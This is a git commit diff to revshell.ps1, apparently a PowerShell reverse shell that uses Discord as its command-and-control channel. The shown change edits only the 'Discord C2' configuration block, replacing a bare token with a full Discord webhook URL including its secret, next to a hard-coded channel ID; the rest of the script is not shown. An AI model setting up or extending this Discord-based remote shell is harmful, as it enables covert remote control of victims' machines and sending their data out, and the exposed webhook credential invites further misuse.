4c9d41bbe672fcf2745723cf657741ab92e9e7f3
bindas88 <63970413+bindas88@users.noreply.github.com>
2024-08-09 00:38:50 +0700

    Update revshell.ps1

--- revshell.ps1
+++ revshell.ps1
@@ -26,7 +26,7 @@ USAGE
 
 # ================================================================ Discord C2 ======================================================================
 
-$token = "h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC" # make sure your bot is in the same server as the webhook
+$token = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC" # make sure your bot is in the same server as the webhook
 $chan = "1168586703536136393" # make sure the bot AND webhook can access this channel
 
 # =============================================================== SCRIPT SETUP =========================================================================
